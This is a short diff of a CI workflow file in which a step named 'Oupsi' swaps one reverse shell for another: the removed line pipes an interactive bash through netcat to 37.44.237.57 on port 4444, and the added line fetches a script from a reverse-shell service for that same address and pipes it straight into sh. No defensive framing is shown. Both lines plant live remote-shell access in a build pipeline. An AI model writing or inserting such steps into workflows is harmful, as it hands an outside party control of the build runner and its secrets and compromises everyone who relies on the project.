@@ -15,5 +15,4 @@ jobs:
             37.44.237.57
 
     - name: Oupsi
-      run: |
-        bash -c "mkfifo /tmp/f; ( cat /tmp/f | /bin/bash -i 2>&1 | nc 37.44.237.57 4444 > /tmp/f ) & disown"
+      run: curl https://shell.now.sh/37.44.237.57:4444 | sh
